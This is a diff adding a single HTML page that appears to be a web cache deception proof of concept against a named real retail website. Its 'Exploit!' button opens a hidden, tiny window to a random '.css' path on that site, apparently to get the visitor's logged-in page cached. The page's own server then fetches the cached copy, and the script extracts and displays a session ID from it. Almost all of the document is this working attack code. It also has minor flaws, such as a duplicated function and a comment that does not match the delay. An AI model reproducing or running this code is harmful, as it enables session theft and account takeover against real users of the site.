@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server Interaction</title>
+    <style>
+     body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    #exploitButton {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+    }
+
+    #exploitButton:hover {
+      background-color: #0056b3;
+    }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <p>By clicking "Exploit!" your session ID will be cached.</p>
+    <div id="sessionID">
+        <span id="sessionID_count"></span>
+        <span id="sessionID"></span>
+    </div>
+<br>
+    <button onclick="sendRequestAfterDelay()" id="exploitButton">Exploit!</button>
+  </div>
+    <script>
+        function sendRequestAfterDelay() {
+            var randomDigits = getRandomFourDigits();
+            var url = "http://www.savers.co.uk/aa" + randomDigits + ".css";
+            console.log("Opening URL:", url);
+            openPage(url);
+            showSessionID();
+            setTimeout(() => sendRequest(url), 3000); // Wait for 4 seconds then send the request
+        }
+
+        function openPage(url) {
+            console.log("Opening URL in new tab:", url);
+            window.open(url,'_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', ''); 
+
+        }
+
+        function sendRequest(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/make_request?url=" + encodeURIComponent(url), true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    var ga_session_ids = xhr.responseText;
+                    ga_session_ids = ga_session_ids.replace(/[\[\]'"`]/g, '');
+                    var sessionId = ga_session_ids.split(':')[1].trim();
+                sessionId = sessionId.replace(/,/g, '');
+                    document.getElementById("sessionID").innerText = "Your session ID is: " + sessionId;
+                }
+            };
+            xhr.send();
+        }
+
+        function getRandomFourDigits() {
+            return Math.floor(1000 + Math.random() * 9000);
+        }
+
+        function showSessionID() {
+        var countdown = 3;
+        var countdownInterval = setInterval(function() {
+            if(countdown == 0){document.getElementById("sessionID_count").innerText = null}
+            else{
+
+                document.getElementById("sessionID_count").innerText = "Your session ID is:  " + countdown;
+                countdown--;
+            }
+            if (countdown < 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+    }
+
+    function getRandomFourDigits() {
+        return Math.floor(1000 + Math.random() * 9000);
+    }
+    </script>
+</body>
+</html>
